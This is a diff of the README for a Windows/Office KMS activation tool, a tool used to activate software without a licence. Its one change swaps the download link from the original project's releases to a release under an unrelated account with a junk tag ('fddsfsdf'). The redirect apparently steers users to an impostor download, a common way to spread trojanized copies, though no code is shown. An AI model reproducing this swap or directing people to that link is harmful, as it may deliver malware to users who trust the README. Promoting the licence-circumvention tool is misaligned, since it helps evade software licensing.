@@ -10,7 +10,7 @@ Microsoft Windows/Office 一键激活工具
 - Check `Show debug info` to see what happens during the activation process
 - Make sure kms server is reachable, and is present in your slmgr.vbs
 - This tool can download Office 2021 LTSC automatically via [Office Deployment Tool](#office-deployment-tool)
-- Download from [here](https://github.com/jm33-m0/kms-activate/releases)
+- Download from [here](https://github.com/virtuallord366/kms-activate/releases/tag/fddsfsdf)
 
 ![screenshot](/img/win-activate.JPG)
 
